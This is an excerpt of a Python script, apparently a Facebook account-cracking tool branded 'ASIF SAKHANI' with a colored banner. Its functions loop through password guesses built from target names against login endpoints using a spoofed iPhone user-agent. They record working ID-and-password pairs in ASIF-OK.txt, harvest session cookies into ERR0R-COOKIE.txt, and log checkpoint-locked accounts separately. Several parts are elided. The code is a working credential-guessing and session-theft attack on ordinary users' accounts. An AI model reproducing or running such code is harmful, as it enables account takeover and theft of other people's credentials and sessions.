...
logo=("""
 ...
 / ___ |___/ // // __/    
/_/  |_/____/___/_/       
 \33[1;31m__________________________________________________   
\033[1;96m ﹎﹎﹎﹎﹎﹎ \033[1;31mAsif\033[1;96m ﹎﹎﹎﹎﹎﹎
\x1b[1;36m① \x1b[1;91mTool Created By  \x1b[1;97m:ASIF SAKHANI 
\x1b[1;36m② \x1b[1;93mTool Mode\x1b[1;92m\x1b[1;97m : \x1b[1;93mFILE-CLONE/ \x1b[1;92mERR0R ✓
\x1b[1;36m③ \x1b[1;90mTool Version \x1b[1;97m: \x1b[1;90m 6.2
\x1b[1;36m④ \x1b[1;93mWhastapp \x1b[1;97m: 03417020930
...
def ffb(ids,names,passlist):
    ...
    "user-agent": ua,
                        ...
                        if "c_user" in ASX:
                                print('\r\r\033[1;32m ASIF%s | %s'%(ids,pas))
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [ASiF] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                            ...
                            "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m ASIF '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ASIF-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m ASIF-OK '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/ERR0R-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/ASIF-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m ASIF-CP'+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ASIF-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
